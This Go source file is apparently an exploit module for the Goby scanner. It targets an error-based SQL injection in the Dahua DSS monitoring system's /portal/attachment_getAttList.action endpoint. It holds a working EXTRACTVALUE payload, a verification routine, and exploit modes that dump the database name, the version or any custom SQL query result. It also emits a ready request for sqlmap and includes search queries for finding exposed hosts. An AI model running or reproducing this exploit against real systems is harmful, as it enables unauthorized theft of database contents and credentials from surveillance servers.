package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS Digital Monitoring System /portal/attachment_getAttList.action SQL Injection Vulnerability",
    "Description": "<p>Dahua DSS digital monitoring system is a security video monitoring system developed by Dahua, which has functions such as real-time monitoring, pan tilt operation, video playback, alarm processing, and equipment managementDahua DSS has an SQL injection vulnerability, where attackers/portal/attachment_getAttList.action route specially constructed packets and use error injection to obtain sensitive database information. Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, site user personal information), but can also write trojans to the server in high privilege situations to further gain access to the server system.</p>",
    "Product": "Dahua DSS Digital Monitoring System",
    "Homepage": "https://www.dahuatech.com/product/lists/169.html",
    "DisclosureDate": "2024-11-14",
    "PostTime": "2024-11-27",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"></span>\" || body=\"dahuaDefined/headCommon.js\" || (title==\"DSS\" && body=\"/portal\")",
    "GobyQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"></span>\" || body=\"dahuaDefined/headCommon.js\" || (title==\"DSS\" && body=\"/portal\")",
    "Level": "2",
    "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.</p>",
    "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p> 2. The manufacturer has released the latest fix version, follow <a href=\"https://www.dahuatech.com/product/lists/169.html\">https://www.dahuatech.com/product/lists/169.html</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/136063698?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "db_name,version,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT%20(ELT(8841=8841,database()))",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "大华 DSS 数字监控系统 /portal/attachment_getAttList.action SQL 注入漏洞",
            "Product": "大华DSS数字监控系统",
            "Description": "<p>大华&nbsp;DSS&nbsp;数字监控系统是大华开发的一款安防视频监控系统，拥有实时监视、云台操作、录像回放、报警处理、设备管理等功能<br>大华 DSS存在SQL注入漏洞，攻击者 /portal/attachment_getAttList.action 路由发送特殊构造的数据包，利用报错注入获取数据库敏感信息。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。&nbsp;</p><p>2、该厂商发布最新修复版本，关注<a href=\"https://www.dahuatech.com/product/lists/169.html\">https://www.dahuatech.com/product/lists/169.html</a><br></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dahua DSS Digital Monitoring System /portal/attachment_getAttList.action SQL Injection Vulnerability",
            "Product": "Dahua DSS Digital Monitoring System",
            "Description": "<p>Dahua DSS digital monitoring system is a security video monitoring system developed by Dahua, which has functions such as real-time monitoring, pan tilt operation, video playback, alarm processing, and equipment managementDahua DSS has an SQL injection vulnerability, where attackers/portal/attachment_getAttList.action route specially constructed packets and use error injection to obtain sensitive database information. Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, site user personal information), but can also write trojans to the server in high privilege situations to further gain access to the server system.<br></p>",
            "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>&nbsp;2. The manufacturer has released the latest fix version, follow <a href=\"https://www.dahuatech.com/product/lists/169.html\">https://www.dahuatech.com/product/lists/169.html</a><br></p>",
            "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9974"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		urlget := "/portal/attachment_getAttList.action?bean.TabName=1&bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,0x7e,(" + sql + "),0x7178786271))%20AND%20(%27mYhO%27=%27mYhOt"
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/portal/attachment_getAttList.action"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			randomNumber := rand.Intn(900000) + 100000 // 保证数字在 100000 到 999999 之间
			checkValue := fmt.Sprintf("%06d", randomNumber)
			hash := md5.New()
			hash.Write([]byte(checkValue))
			content := hex.EncodeToString(hash.Sum(nil))[0:29] //装换为md5值 后续用与验证

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "SELECT%20(ELT(8841=8841,md5("+checkValue+")))"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			defaultModeMap := map[string]string{
				"db_name": "SELECT%20(ELT(8841=8841,database()))",
				"version": "SELECT%20(ELT(8841=8841,version()))",
			}
			//content := "XPATH syntax error"
			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /portal/attachment_getAttList.action?bean.TabName=1&bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,0x7e,(SELECT%20(ELT(8841=8841,database()))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Content-Type: application/x-www-form-urlencoded\n"
			// 3.配置正则语句，从响应包中提取出数据
			regular := `'~~(.*?)qxxbq'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "db_name" {
				sql := defaultModeMap["db_name"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "version" {
				sql := defaultModeMap["version"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
